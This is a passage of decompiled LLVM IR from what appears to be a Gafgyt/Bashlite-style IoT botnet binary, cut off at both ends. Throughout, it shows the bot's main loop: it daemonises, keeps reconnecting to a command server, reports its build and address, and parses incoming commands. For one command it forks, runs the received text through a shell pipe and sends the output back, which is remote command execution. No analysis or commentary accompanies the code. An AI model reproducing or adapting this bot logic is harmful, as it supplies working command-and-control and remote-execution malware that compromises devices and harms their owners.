  store i32 %v1_804d3b0, i32* %stack_var_-5888, align 4
  %v4_804d3d3 = call i32 @__libc_waitpid(i32 %v1_804d3b0, i32 %v2_804d3c6, i32 0)
  store i32 %v4_804d3d3, i32* @eax, align 4
  store i32 0, i32* %stack_var_-5888, align 4
  %v1_804d3df = call i32 @__GI_exit(i32 0)
  store i1 false, i1* %cf.global-to-local, align 1
  store i32 ptrtoint ([13 x i8]* @global_var_8056c5b.142 to i32), i32* %stack_var_-5888, align 4
  %v1_804d421 = call i32 @zprintf(i32 ptrtoint ([13 x i8]* @global_var_8056c5b.142 to i32))
  br label %dec_label_pc_804d426

dec_label_pc_804d426:                             ; preds = %dec_label_pc_804d404.thread, %dec_label_pc_804d40a, %dec_label_pc_804d419
  %v0_804d426 = call i32 @__GI_setsid()
  store i32 ptrtoint (i8** @global_var_8056c4f.139 to i32), i32* %stack_var_-5888, align 4
  %v1_804d432 = call i32 @chdir(i32 ptrtoint (i8** @global_var_8056c4f.139 to i32))
  store i32 13, i32* %stack_var_-5888, align 4
  %v3_804d446 = call i32 @__bsd_signal(i32 13, i32 1)
  %v2_804db03 = ptrtoint i32* %stack_var_-5744 to i32
  %tmp121 = bitcast i32* %stack_var_-5744 to i8*
  %tmp122 = bitcast i8** %stack_var_-36 to i32*
  %v2_804d8f2 = ptrtoint i32* %stack_var_-1648 to i32
  %v4_804d90e = bitcast i32* %stack_var_-1648 to i8*
  %v1_804d76f = or i32 %v2_804db03, 1
  %storemerge13127 = inttoptr i32 %v1_804d76f to i8*
  br label %dec_label_pc_804d44d.outer

dec_label_pc_804d44d.outer:                       ; preds = %dec_label_pc_804d72f, %dec_label_pc_804db03, %dec_label_pc_804d426
  %stack_var_-96.0.ph19 = phi i32 [ 0, %dec_label_pc_804d426 ], [ %stack_var_-96.2.ph, %dec_label_pc_804db03 ], [ %v4_804d72f, %dec_label_pc_804d72f ]
  %v0_804d44d24 = call i32 @initConnection()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804d45225 = icmp eq i32 %v0_804d44d24, 0
  br i1 %v1_804d45225, label %dec_label_pc_804d464, label %dec_label_pc_804d456

dec_label_pc_804d456:                             ; preds = %dec_label_pc_804d44d.outer, %dec_label_pc_804d456
  store i32 30, i32* %stack_var_-5888, align 4
  %v1_804d45d = call i32 @sleep(i32 30)
  %v0_804d44d = call i32 @initConnection()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804d452 = icmp eq i32 %v0_804d44d, 0
  br i1 %v1_804d452, label %dec_label_pc_804d464, label %dec_label_pc_804d456

dec_label_pc_804d464:                             ; preds = %dec_label_pc_804d456, %dec_label_pc_804d44d.outer
  %v0_804d464 = call i32 @getBuild()
  store i32 %v0_804d464, i32* @ebx, align 4
  %v0_804d46b = load i32, i32* @global_var_8060968.41, align 8
  store i32 %v0_804d46b, i32* %stack_var_-5888, align 4
  %v1_804d473 = call i32 @__GI_inet_ntoa(i32 %v0_804d46b)
  %v0_804d478 = load i32, i32* @global_var_805a6e0.18, align 32
  store i32 %v0_804d478, i32* %stack_var_-5888, align 4
  %v3_804d491 = call i32 @Rootsprintf(i32 %v0_804d478, i32 ptrtoint (i32* @global_var_8056c68.143 to i32))
  br label %dec_label_pc_804db03.outer

dec_label_pc_804d4b5:                             ; preds = %dec_label_pc_804d6a6, %dec_label_pc_804d65e
  %v2_804d4b8 = mul i32 %storemerge14, 4
  %v9_804d4b8 = and i32 %storemerge14, 1073741824
  %v10_804d4b8 = icmp ne i32 %v9_804d4b8, 0
  store i1 %v10_804d4b8, i1* %cf.global-to-local, align 1
  %v0_804d4bd = load i32, i32* @global_var_8060974.34, align 4
  %v2_804d4c2 = add i32 %v0_804d4bd, %v2_804d4b8
  %v1_804d4c5 = inttoptr i32 %v2_804d4c2 to i32*
  %v2_804d4c5 = load i32, i32* %v1_804d4c5, align 4
  store i32 %v2_804d4c5, i32* %stack_var_-5888, align 4
  %v4_804d4da = call i32 @__libc_waitpid(i32 %v2_804d4c5, i32 0, i32 1)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp123 = icmp slt i32 %v4_804d4da, 1
  %.pre = add i32 %storemerge14, 1
  br i1 %tmp123, label %dec_label_pc_804d65b, label %dec_label_pc_804d4e7

dec_label_pc_804d4e7:                             ; preds = %dec_label_pc_804d4b5
  br label %dec_label_pc_804d51a

dec_label_pc_804d4f0:                             ; preds = %dec_label_pc_804d51a, %dec_label_pc_804d554
  %v2_804d4f3 = mul i32 %storemerge16, 4
  %v0_804d4f8 = load i32, i32* @global_var_8060974.34, align 4
  %v2_804d4fd = add i32 %v0_804d4f8, %v2_804d4f3
  %v1_804d500 = add i32 %v2_804d4fd, -4
  %v1_804d513 = inttoptr i32 %v2_804d4fd to i32*
  %v2_804d513 = load i32, i32* %v1_804d513, align 4
  %v2_804d515 = inttoptr i32 %v1_804d500 to i32*
  store i32 %v2_804d513, i32* %v2_804d515, align 4
  %v4_804d517 = add i32 %storemerge16, 1
  br label %dec_label_pc_804d51a

dec_label_pc_804d51a:                             ; preds = %dec_label_pc_804d4e7, %dec_label_pc_804d4f0
  %storemerge16 = phi i32 [ %v4_804d517, %dec_label_pc_804d4f0 ], [ %.pre, %dec_label_pc_804d4e7 ]
  %v0_804d52e = load i32, i32* @global_var_805a6e8.32, align 8
  %v0_804d534 = load i32, i32* @global_var_805a6ec.33, align 4
  %v10_804d54c = icmp eq i32 %v0_804d534, 0
  br i1 %v10_804d54c, label %dec_label_pc_804d554, label %dec_label_pc_804d4f0

dec_label_pc_804d554:                             ; preds = %dec_label_pc_804d51a
  store i32 0, i32* @esi, align 4
  store i32 %v0_804d52e, i32* @edi, align 4
  %v10_804d568 = icmp ult i32 %storemerge16, %v0_804d52e
  br i1 %v10_804d568, label %dec_label_pc_804d4f0, label %dec_label_pc_804d570

dec_label_pc_804d570:                             ; preds = %dec_label_pc_804d554
  %v2_804d573 = mul i32 %storemerge16, 4
  %v0_804d578 = load i32, i32* @global_var_8060974.34, align 4
  %v2_804d57d = add i32 %v2_804d573, -4
  %v1_804d580 = add i32 %v2_804d57d, %v0_804d578
  %v1_804d583 = inttoptr i32 %v1_804d580 to i32*
  store i32 0, i32* %v1_804d583, align 4
  %v0_804d589 = load i32, i32* @global_var_805a6e8.32, align 8
  %v0_804d58e = load i32, i32* @global_var_805a6ec.33, align 4
  %v1_804d594 = add i32 %v0_804d589, -1
  %v4_804d594 = icmp ne i32 %v0_804d589, 0
  %v2_804d597 = zext i1 %v4_804d594 to i32
  %v3_804d597 = add i32 %v0_804d58e, -1
  %v4_804d597 = add i32 %v3_804d597, %v2_804d597
  store i32 %v1_804d594, i32* @global_var_805a6e8.32, align 8
  store i32 %v4_804d597, i32* @global_var_805a6ec.33, align 4
  %v2_804d5b4 = mul i32 %v1_804d594, 4
  %v1_804d5b7 = add i32 %v2_804d5b4, 4
  %v5_804d5b7 = icmp eq i32 %v2_804d5b4, -4
  store i1 %v5_804d5b7, i1* %cf.global-to-local, align 1
  store i32 %v1_804d5b7, i32* %stack_var_-5888, align 4
  %v1_804d5bd = call i32 @malloc(i32 %v1_804d5b7)
  br label %dec_label_pc_804d5f0

dec_label_pc_804d5ce:                             ; preds = %dec_label_pc_804d5f0, %dec_label_pc_804d62a
  %v2_804d5d1 = mul i32 %storemerge15, 4
  %v5_804d5d6 = add i32 %v2_804d5d1, %v1_804d5bd
  %v0_804d5e1 = load i32, i32* @global_var_8060974.34, align 4
  %v2_804d5e6 = add i32 %v0_804d5e1, %v2_804d5d1
  %v1_804d5e9 = inttoptr i32 %v2_804d5e6 to i32*
  %v2_804d5e9 = load i32, i32* %v1_804d5e9, align 4
  %v2_804d5eb = inttoptr i32 %v5_804d5d6 to i32*
  store i32 %v2_804d5e9, i32* %v2_804d5eb, align 4
  %v4_804d5ed = add i32 %storemerge15, 1
  br label %dec_label_pc_804d5f0

dec_label_pc_804d5f0:                             ; preds = %dec_label_pc_804d570, %dec_label_pc_804d5ce
  %storemerge15 = phi i32 [ %v4_804d5ed, %dec_label_pc_804d5ce ], [ 0, %dec_label_pc_804d570 ]
  %v0_804d604 = load i32, i32* @global_var_805a6e8.32, align 8
  %v0_804d60a = load i32, i32* @global_var_805a6ec.33, align 4
  %v10_804d622 = icmp eq i32 %v0_804d60a, 0
  br i1 %v10_804d622, label %dec_label_pc_804d62a, label %dec_label_pc_804d5ce

dec_label_pc_804d62a:                             ; preds = %dec_label_pc_804d5f0
  store i32 0, i32* @esi, align 4
  store i32 %v0_804d604, i32* @edi, align 4
  %v10_804d63e = icmp ult i32 %storemerge15, %v0_804d604
  br i1 %v10_804d63e, label %dec_label_pc_804d5ce, label %dec_label_pc_804d646

dec_label_pc_804d646:                             ; preds = %dec_label_pc_804d62a
  store i1 false, i1* %cf.global-to-local, align 1
  %v0_804d646 = load i32, i32* @global_var_8060974.34, align 4
  store i32 %v0_804d646, i32* %stack_var_-5888, align 4
  %v1_804d64e = call i32 @free(i32 %v0_804d646)
  store i32 %v1_804d5bd, i32* @global_var_8060974.34, align 4
  br label %dec_label_pc_804d65b

dec_label_pc_804d65b:                             ; preds = %dec_label_pc_804d4b5, %dec_label_pc_804d646
  br label %dec_label_pc_804d65e

dec_label_pc_804d65e:                             ; preds = %dec_label_pc_804db03, %dec_label_pc_804d65b
  %storemerge14 = phi i32 [ %.pre, %dec_label_pc_804d65b ], [ 0, %dec_label_pc_804db03 ]
  %v1_804d667 = ashr i32 %storemerge14, 31
  %v0_804d66e = load i32, i32* @global_var_805a6e8.32, align 8
  store i32 %v0_804d66e, i32* @esi, align 4
  %v0_804d674 = load i32, i32* @global_var_805a6ec.33, align 4
  store i32 %v0_804d674, i32* @edi, align 4
  %v10_804d68c = icmp ult i32 %v1_804d667, %v0_804d674
  store i1 %v10_804d68c, i1* %cf.global-to-local, align 1
  br i1 %v10_804d68c, label %dec_label_pc_804d4b5, label %dec_label_pc_804d698

dec_label_pc_804d698:                             ; preds = %dec_label_pc_804d65e
  store i1 false, i1* %cf.global-to-local, align 1
  %v6_804d6a4 = icmp ugt i32 %v1_804d667, %v0_804d674
  br i1 %v6_804d6a4, label %dec_label_pc_804d6b8, label %dec_label_pc_804d6a6

dec_label_pc_804d6a6:                             ; preds = %dec_label_pc_804d698
  %v10_804d6ac = icmp ult i32 %storemerge14, %v0_804d66e
  store i1 %v10_804d6ac, i1* %cf.global-to-local, align 1
  br i1 %v10_804d6ac, label %dec_label_pc_804d4b5, label %dec_label_pc_804d6b8

dec_label_pc_804d6b8:                             ; preds = %dec_label_pc_804d6a6, %dec_label_pc_804d698
  %v0_804d6bb = load i32, i32* @ebp, align 4
  %v2_804d6bb = add i32 %v5_804db1e, -5736
  %v3_804d6bb = add i32 %v2_804d6bb, %v0_804d6bb
  %v4_804d6bb = inttoptr i32 %v3_804d6bb to i8*
  store i8 0, i8* %v4_804d6bb, align 1
  store i32 %v2_804db03, i32* %stack_var_-5888, align 4
  %v2_804d6cc = call i32 @trim(i8* %tmp121)
  store i32 %v2_804db03, i32* %stack_var_-5888, align 4
  %v4_804d6e2 = call i32 @strstr(i32 %v2_804db03, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_80566e0.19, i32 0, i32 0))
  %v7_804d6ef = icmp ult i32 %v4_804d6e2, %v2_804db03
  store i1 %v7_804d6ef, i1* %cf.global-to-local, align 1
  %v12_804d6ef = icmp eq i32 %v4_804d6e2, %v2_804db03
  %v1_804d6f1 = icmp eq i1 %v12_804d6ef, false
  br i1 %v1_804d6f1, label %dec_label_pc_804d70d, label %dec_label_pc_804d6f3

dec_label_pc_804d6f3:                             ; preds = %dec_label_pc_804d6b8
  %v0_804d6f3 = load i32, i32* @global_var_805a6e0.18, align 32
  store i32 %v0_804d6f3, i32* %stack_var_-5888, align 4
  %v3_804d703 = call i32 @Rootsprintf(i32 %v0_804d6f3, i32 ptrtoint ([5 x i8]* @global_var_8056ccf.144 to i32))
  br label %dec_label_pc_804db03

dec_label_pc_804d70d:                             ; preds = %dec_label_pc_804d6b8
  store i32 %v2_804db03, i32* %stack_var_-5888, align 4
  %v4_804d71e = call i32 @strstr(i32 %v2_804db03, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8056cd4.145, i32 0, i32 0))
  store i32 %v4_804d71e, i32* @edx, align 4
  %v7_804d72b = icmp ult i32 %v4_804d71e, %v2_804db03
  store i1 %v7_804d72b, i1* %cf.global-to-local, align 1
  %v12_804d72b = icmp eq i32 %v4_804d71e, %v2_804db03
  %v1_804d72d = icmp eq i1 %v12_804d72b, false
  br i1 %v1_804d72d, label %dec_label_pc_804d755, label %dec_label_pc_804d72f

dec_label_pc_804d72f:                             ; preds = %dec_label_pc_804d70d
  %v4_804d72f = add i32 %stack_var_-96.2.ph, 1
  store i32 ptrtoint ([20 x i8]* @global_var_8056cdd.146 to i32), i32* %stack_var_-5888, align 4
  %v1_804d73a = call i32 @zprintf(i32 ptrtoint ([20 x i8]* @global_var_8056cdd.146 to i32))
  store i32 %v1_804d73a, i32* @eax, align 4
  %v9_804d73f = icmp ult i32 %v4_804d72f, 20
  store i1 %v9_804d73f, i1* %cf.global-to-local, align 1
  %v7_804d743 = icmp sgt i32 %v4_804d72f, 20
  br i1 %v7_804d743, label %dec_label_pc_804d749, label %dec_label_pc_804d44d.outer

dec_label_pc_804d749:                             ; preds = %dec_label_pc_804d72f
  store i32 0, i32* %stack_var_-5888, align 4
  %v1_804d750 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_804d755

dec_label_pc_804d755:                             ; preds = %dec_label_pc_804d70d, %dec_label_pc_804d749
  %stack_var_-96.1 = phi i32 [ %stack_var_-96.2.ph, %dec_label_pc_804d70d ], [ %v4_804d72f, %dec_label_pc_804d749 ]
  %v2_804d761 = load i8, i8* %tmp121, align 4
  %v6_804d764 = icmp ult i8 %v2_804d761, 33
  store i1 %v6_804d764, i1* %cf.global-to-local, align 1
  %v10_804d764 = icmp eq i8 %v2_804d761, 33
  %v1_804d766 = icmp eq i1 %v10_804d764, false
  br i1 %v1_804d766, label %dec_label_pc_804db03.outer, label %dec_label_pc_804d76c

dec_label_pc_804d76c:                             ; preds = %dec_label_pc_804d755
  %v2_804d77b128 = load i8, i8* %storemerge13127, align 1
  %v3_804d77e131 = icmp ult i8 %v2_804d77b128, 32
  store i1 %v3_804d77e131, i1* %cf.global-to-local, align 1
  %v7_804d77e135 = icmp eq i8 %v2_804d77b128, 32
  br i1 %v7_804d77e135, label %dec_label_pc_804d78c, label %dec_label_pc_804d782

dec_label_pc_804d775:                             ; preds = %dec_label_pc_804d782
  %v5_804d775 = add i32 %storemerge13.in137, 1
  %storemerge13 = inttoptr i32 %v5_804d775 to i8*
  %v2_804d77b = load i8, i8* %storemerge13, align 1
  %v3_804d77e = icmp ult i8 %v2_804d77b, 32
  store i1 %v3_804d77e, i1* %cf.global-to-local, align 1
  %v7_804d77e = icmp eq i8 %v2_804d77b, 32
  br i1 %v7_804d77e, label %dec_label_pc_804d78c, label %dec_label_pc_804d782

dec_label_pc_804d782:                             ; preds = %dec_label_pc_804d76c, %dec_label_pc_804d775
  %storemerge13138 = phi i8* [ %storemerge13, %dec_label_pc_804d775 ], [ %storemerge13127, %dec_label_pc_804d76c ]
  %storemerge13.in137 = phi i32 [ %v5_804d775, %dec_label_pc_804d775 ], [ %v1_804d76f, %dec_label_pc_804d76c ]
  %v2_804d785 = load i8, i8* %storemerge13138, align 1
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804d788 = icmp eq i8 %v2_804d785, 0
  %v1_804d78a = icmp eq i1 %v4_804d788, false
  br i1 %v1_804d78a, label %dec_label_pc_804d775, label %dec_label_pc_804d78c

dec_label_pc_804d78c:                             ; preds = %dec_label_pc_804d775, %dec_label_pc_804d782, %dec_label_pc_804d76c
  %storemerge13.lcssa = phi i8* [ %storemerge13127, %dec_label_pc_804d76c ], [ %storemerge13138, %dec_label_pc_804d782 ], [ %storemerge13, %dec_label_pc_804d775 ]
  %v2_804d78f = load i8, i8* %storemerge13.lcssa, align 1
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804d792 = icmp eq i8 %v2_804d78f, 0
  br i1 %v4_804d792, label %dec_label_pc_804db03.outer, label %dec_label_pc_804d79a

dec_label_pc_804d79a:                             ; preds = %dec_label_pc_804d78c
  store i8 0, i8* %storemerge13.lcssa, align 1
  %v3_804d7be = call i32 @_strlen(i8* %storemerge13127)
  %v6_804d7c5 = add i32 %v2_804db03, %v3_804d7be
  %v1_804d7c8 = add i32 %v6_804d7c5, 2
  %v5_804d7c8 = icmp ugt i32 %v6_804d7c5, -3
  store i1 %v5_804d7c8, i1* %cf.global-to-local, align 1
  %v5_804d7cb = inttoptr i32 %v1_804d7c8 to i8*
  br label %dec_label_pc_804d7f5

dec_label_pc_804d7d0:                             ; preds = %dec_label_pc_804d81e, %dec_label_pc_804d7f5
  %v3_804d7e7 = call i32 @_strlen(i8* %v5_804d7cb)
  %v4_804d7e7 = mul i32 %v3_804d7e7, -1
  %v1_804d7ed = sub i32 0, %v4_804d7e7
  %v6_804d7ee = sub i32 %v1_804d7c8, %v4_804d7e7
  %v11_804d7ee = icmp ult i32 %v6_804d7ee, %v1_804d7ed
  store i1 %v11_804d7ee, i1* %cf.global-to-local, align 1
  %v1_804d7f1 = add i32 %v6_804d7ee, -1
  %v1_804d7f2 = inttoptr i32 %v1_804d7f1 to i8*
  store i8 0, i8* %v1_804d7f2, align 1
  br label %dec_label_pc_804d7f5

dec_label_pc_804d7f5:                             ; preds = %dec_label_pc_804d79a, %dec_label_pc_804d7d0
  %v3_804d80c = call i32 @_strlen(i8* %v5_804d7cb)
  %v4_804d80c = mul i32 %v3_804d80c, -1
  %v1_804d812 = sub i32 0, %v4_804d80c
  %v6_804d813 = sub i32 %v1_804d7c8, %v4_804d80c
  %v11_804d813 = icmp ult i32 %v6_804d813, %v1_804d812
  store i1 %v11_804d813, i1* %cf.global-to-local, align 1
  %v1_804d816 = add i32 %v6_804d813, -1
  %v1_804d817 = inttoptr i32 %v1_804d816 to i8*
  %v2_804d817 = load i8, i8* %v1_804d817, align 1
  %v6_804d81a = icmp ult i8 %v2_804d817, 10
  store i1 %v6_804d81a, i1* %cf.global-to-local, align 1
  %v10_804d81a = icmp eq i8 %v2_804d817, 10
  br i1 %v10_804d81a, label %dec_label_pc_804d7d0, label %dec_label_pc_804d81e

dec_label_pc_804d81e:                             ; preds = %dec_label_pc_804d7f5
  %v3_804d835 = call i32 @_strlen(i8* %v5_804d7cb)
  %v4_804d835 = mul i32 %v3_804d835, -1
  %v1_804d83b = sub i32 0, %v4_804d835
  %v6_804d83c = sub i32 %v1_804d7c8, %v4_804d835
  %v11_804d83c = icmp ult i32 %v6_804d83c, %v1_804d83b
  store i1 %v11_804d83c, i1* %cf.global-to-local, align 1
  %v1_804d83f = add i32 %v6_804d83c, -1
  %v1_804d840 = inttoptr i32 %v1_804d83f to i8*
  %v2_804d840 = load i8, i8* %v1_804d840, align 1
  %v6_804d843 = icmp ult i8 %v2_804d840, 13
  store i1 %v6_804d843, i1* %cf.global-to-local, align 1
  %v10_804d843 = icmp eq i8 %v2_804d840, 13
  br i1 %v10_804d843, label %dec_label_pc_804d7d0, label %dec_label_pc_804d847

dec_label_pc_804d847:                             ; preds = %dec_label_pc_804d81e
  %v2_804d855143 = load i8, i8* %v5_804d7cb, align 1
  %v3_804d858146 = icmp ult i8 %v2_804d855143, 32
  store i1 %v3_804d858146, i1* %cf.global-to-local, align 1
  %v7_804d858150 = icmp eq i8 %v2_804d855143, 32
  br i1 %v7_804d858150, label %dec_label_pc_804d866, label %dec_label_pc_804d85c

dec_label_pc_804d84f:                             ; preds = %dec_label_pc_804d85c
  %v5_804d84f = add i32 %v4_804d852153, 1
  %v22_804d84f = inttoptr i32 %v5_804d84f to i8*
  %v2_804d855 = load i8, i8* %v22_804d84f, align 1
  %v3_804d858 = icmp ult i8 %v2_804d855, 32
  store i1 %v3_804d858, i1* %cf.global-to-local, align 1
  %v7_804d858 = icmp eq i8 %v2_804d855, 32
  br i1 %v7_804d858, label %dec_label_pc_804d866, label %dec_label_pc_804d85c

dec_label_pc_804d85c:                             ; preds = %dec_label_pc_804d847, %dec_label_pc_804d84f
  %v4_804d852153 = phi i32 [ %v5_804d84f, %dec_label_pc_804d84f ], [ %v1_804d7c8, %dec_label_pc_804d847 ]
  %stack_var_-64.0152 = phi i8* [ %v22_804d84f, %dec_label_pc_804d84f ], [ %v5_804d7cb, %dec_label_pc_804d847 ]
  %v2_804d85f = load i8, i8* %stack_var_-64.0152, align 1
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804d862 = icmp eq i8 %v2_804d85f, 0
  %v1_804d864 = icmp eq i1 %v4_804d862, false
  br i1 %v1_804d864, label %dec_label_pc_804d84f, label %dec_label_pc_804d866

dec_label_pc_804d866:                             ; preds = %dec_label_pc_804d84f, %dec_label_pc_804d85c, %dec_label_pc_804d847
  %stack_var_-64.0.lcssa = phi i8* [ %v5_804d7cb, %dec_label_pc_804d847 ], [ %stack_var_-64.0152, %dec_label_pc_804d85c ], [ %v22_804d84f, %dec_label_pc_804d84f ]
  %v4_804d852.lcssa = phi i32 [ %v1_804d7c8, %dec_label_pc_804d847 ], [ %v4_804d852153, %dec_label_pc_804d85c ], [ %v5_804d84f, %dec_label_pc_804d84f ]
  store i8 0, i8* %stack_var_-64.0.lcssa, align 1
  %v5_804d86c = add i32 %v4_804d852.lcssa, 1
  %v2_804d895159 = load i8, i8* %v5_804d7cb, align 1
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804d898161 = icmp eq i8 %v2_804d895159, 0
  %v1_804d89a163 = icmp eq i1 %v4_804d898161, false
  br i1 %v1_804d89a163, label %dec_label_pc_804d877, label %dec_label_pc_804d89c

dec_label_pc_804d877:                             ; preds = %dec_label_pc_804d866, %dec_label_pc_804d877
  %storemerge12165 = phi i8* [ %storemerge12, %dec_label_pc_804d877 ], [ %v5_804d7cb, %dec_label_pc_804d866 ]
  %storemerge12.in164 = phi i32 [ %v5_804d88f, %dec_label_pc_804d877 ], [ %v1_804d7c8, %dec_label_pc_804d866 ]
  %v2_804d87a = load i8, i8* %storemerge12165, align 1
  %v3_804d87a = zext i8 %v2_804d87a to i32
  store i32 %v3_804d87a, i32* %stack_var_-5888, align 4
  %v1_804d883 = call i32 @__GI_toupper(i32 %v3_804d87a)
  %v1_804d888 = urem i32 %v1_804d883, 256
  %v2_804d888 = load i32, i32* @edx, align 4
  %v3_804d888 = and i32 %v2_804d888, -256
  %v4_804d888 = or i32 %v3_804d888, %v1_804d888
  store i32 %v4_804d888, i32* @edx, align 4
  %v1_804d88d = trunc i32 %v1_804d883 to i8
  store i8 %v1_804d88d, i8* %storemerge12165, align 1
  %v5_804d88f = add i32 %storemerge12.in164, 1
  %storemerge12 = inttoptr i32 %v5_804d88f to i8*
  %v2_804d895 = load i8, i8* %storemerge12, align 1
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804d898 = icmp eq i8 %v2_804d895, 0
  %v1_804d89a = icmp eq i1 %v4_804d898, false
  br i1 %v1_804d89a, label %dec_label_pc_804d877, label %dec_label_pc_804d89c

dec_label_pc_804d89c:                             ; preds = %dec_label_pc_804d877, %dec_label_pc_804d866
  store i1 false, i1* @df, align 1
  store i32 %v1_804d7c8, i32* @esi, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_8056cf1.147 to i32), i32* @edi, align 4
  %v7_804d8cc = call i32 @_strncmp(i8* %v5_804d7cb, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_8056cf1.147, i32 0, i32 0), i32 11)
  %v8_804d8cc = urem i32 %v7_804d8cc, 2
  %v9_804d8cc = icmp eq i32 %v8_804d8cc, 0
  %v0_804d8ce = load i1, i1* %cf.global-to-local, align 1
  %v2_804d8ce = or i1 %v0_804d8ce, %v9_804d8cc
  %v3_804d8ce = zext i1 %v2_804d8ce to i32
  %v4_804d8ce = load i32, i32* @edx, align 4
  %v5_804d8ce = and i32 %v4_804d8ce, -256
  %v6_804d8ce = or i32 %v3_804d8ce, %v5_804d8ce
  %v7_804d8ce = xor i32 %v6_804d8ce, 1
  store i32 %v7_804d8ce, i32* @edx, align 4
  %v3_804d8d4 = and i32 %v7_804d8cc, -256
  %v1_804d8d6 = trunc i32 %v7_804d8ce to i8
  %v3_804d8d6 = zext i1 %v0_804d8ce to i8
  %v4_804d8d6 = sub nsw i8 %v1_804d8d6, %v3_804d8d6
  %v15_804d8d6 = icmp eq i8 %v4_804d8d6, 0
  %v20_804d8d6 = zext i8 %v4_804d8d6 to i32
  %v23_804d8d6 = or i32 %v20_804d8d6, %v3_804d8d4
  store i32 %v23_804d8d6, i32* @ecx, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804d8df = icmp eq i1 %v15_804d8d6, false
  br i1 %v1_804d8df, label %dec_label_pc_804d9e0, label %dec_label_pc_804d8e5

dec_label_pc_804d8e5:                             ; preds = %dec_label_pc_804d89c
  %v0_804d8e5 = call i32 @listFork()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804d8ea = icmp eq i32 %v0_804d8e5, 0
  %v1_804d8ec = icmp eq i1 %v1_804d8ea, false
  br i1 %v1_804d8ec, label %dec_label_pc_804db03.outer, label %dec_label_pc_804d8f2

dec_label_pc_804d8f2:                             ; preds = %dec_label_pc_804d8e5
  store i32 %v2_804d8f2, i32* %stack_var_-5888, align 4
  %v5_804d90e = call i32 @__GI_memset(i8* %v4_804d90e, i32 0, i32 1024)
  store i32 %v2_804d8f2, i32* %stack_var_-5888, align 4
  %v4_804d92c = call i32 @szprintf(i32 %v2_804d8f2, i32 ptrtoint ([8 x i8]* @global_var_8056cfc.148 to i32), i32 %v5_804d86c)
  store i32 %v2_804d8f2, i32* %stack_var_-5888, align 4
  %v4_804d943 = call i32 @fdpopen(i32 %v2_804d8f2, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_8056c40.137, i32 0, i32 0))
  store i32 %v2_804d8f2, i32* %stack_var_-5888, align 4
  %v4_804d9c0166 = call i32 @fdgets(i32 %v2_804d8f2, i32 1024, i32 %v4_804d943)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804d9c5167 = icmp eq i32 %v4_804d9c0166, 0
  %v1_804d9c7169 = icmp eq i1 %v1_804d9c5167, false
  br i1 %v1_804d9c7169, label %dec_label_pc_804d94d, label %dec_label_pc_804d9c9

dec_label_pc_804d94d:                             ; preds = %dec_label_pc_804d8f2, %dec_label_pc_804d94d
  store i32 %v2_804d8f2, i32* %stack_var_-5888, align 4
  %v2_804d956 = call i32 @trim(i8* %v4_804d90e)
  %v0_804d95b = load i32, i32* @global_var_805a6e0.18, align 32
  store i32 %v0_804d95b, i32* %stack_var_-5888, align 4
  %v3_804d976 = call i32 @Rootsprintf(i32 %v0_804d95b, i32 ptrtoint ([3 x i8]* @global_var_8056d04.149 to i32))
  store i32 %v2_804d8f2, i32* %stack_var_-5888, align 4
  %v5_804d997 = call i32 @__GI_memset(i8* %v4_804d90e, i32 0, i32 1024)
  store i32 1, i32* %stack_var_-5888, align 4
  %v1_804d9a3 = call i32 @sleep(i32 1)
  store i32 %v2_804d8f2, i32* %stack_var_-5888, align 4
  %v4_804d9c0 = call i32 @fdgets(i32 %v2_804d8f2, i32 1024, i32 %v4_804d943)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804d9c5 = icmp eq i32 %v4_804d9c0, 0
  %v1_804d9c7 = icmp eq i1 %v1_804d9c5, false
  br i1 %v1_804d9c7, label %dec_label_pc_804d94d, label %dec_label_pc_804d9c9

dec_label_pc_804d9c9:                             ; preds = %dec_label_pc_804d94d, %dec_label_pc_804d8f2
  store i32 %v4_804d943, i32* %stack_var_-5888, align 4
  %v1_804d9cf = call i32 @fdpclose(i32 %v4_804d943)
  store i32 %v1_804d9cf, i32* @eax, align 4
  store i32 0, i32* %stack_var_-5888, align 4
  %v1_804d9db = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_804d9e0

dec_label_pc_804d9e0:                             ; preds = %dec_label_pc_804d89c, %dec_label_pc_804d9c9
  store i32 %v5_804d86c, i32* @eax, align 4
  store i32 %v5_804d86c, i32* %stack_var_-5888, align 4
  %v3_804d9f5 = call i32 @__GI_strtok(i32 %v5_804d86c, i32 ptrtoint (i32* @global_var_8056d07.150 to i32))
  %v5_804d9fa = inttoptr i32 %v3_804d9f5 to i8*
  store i8* %v5_804d9fa, i8** %stack_var_-36, align 4
  store i32 %v1_804d7c8, i32* %stack_var_-624, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v5_804dab134 = icmp eq i32 %v3_804d9f5, 0
  %v1_804dab541 = icmp eq i1 %v5_804dab134, false
  br i1 %v1_804dab541, label %dec_label_pc_804da0b, label %dec_label_pc_804dabb

dec_label_pc_804da0b:                             ; preds = %dec_label_pc_804d9e0, %dec_label_pc_804da9a
  %v3_804da1c = phi i8* [ %tmp124, %dec_label_pc_804da9a ], [ %v5_804d9fa, %dec_label_pc_804d9e0 ]
  %stack_var_-40.142 = phi i32 [ %stack_var_-40.0, %dec_label_pc_804da9a ], [ 1, %dec_label_pc_804d9e0 ]
  %v2_804da0e = load i8, i8* %v3_804da1c, align 1
  %v3_804da0e = zext i8 %v2_804da0e to i32
  store i32 %v3_804da0e, i32* @eax, align 4
  %v6_804da11 = icmp ult i8 %v2_804da0e, 10
  store i1 %v6_804da11, i1* %cf.global-to-local, align 1
  %v10_804da11 = icmp eq i8 %v2_804da0e, 10
  br i1 %v10_804da11, label %dec_label_pc_804da9a, label %dec_label_pc_804da19

dec_label_pc_804da19:                             ; preds = %dec_label_pc_804da0b
